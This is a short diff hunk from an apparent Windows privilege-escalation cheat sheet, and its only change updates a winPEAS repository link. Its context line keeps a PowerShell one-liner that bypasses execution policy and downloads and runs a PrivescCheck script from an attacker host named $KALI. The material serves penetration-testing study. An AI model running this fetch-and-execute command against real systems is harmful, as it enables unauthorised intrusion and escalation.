@@ -892,7 +892,7 @@ Or run it in a single line:
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://$KALI/PrivescCheck.ps1'); Invoke-PrivescCheck"
 ```
 
-### 8.3. [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
+### 8.3. [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
 
 [Releases](https://github.com/peass-ng/PEASS-ng/releases)
 
